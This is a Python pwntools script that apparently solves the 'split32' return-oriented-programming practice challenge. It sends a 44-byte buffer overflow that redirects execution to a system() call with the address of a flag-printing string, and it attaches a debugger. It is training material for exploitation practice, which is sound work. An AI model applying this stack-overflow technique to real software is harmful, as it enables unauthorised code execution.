#!/usr/bin/env python
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

local = 1
if local:
	p = process('./split32')
else:
	p = remote()

call_sys = 0x08048657
cat_flag = 0x0804A030

gdb.attach(p, 'b 0x8048647')

payload = cyclic(0x60)
payload = 'A' * 44 + p32(call_sys) + p32(cat_flag)
p.recvuntil('> ')
p.sendline(payload)

p.interactive()
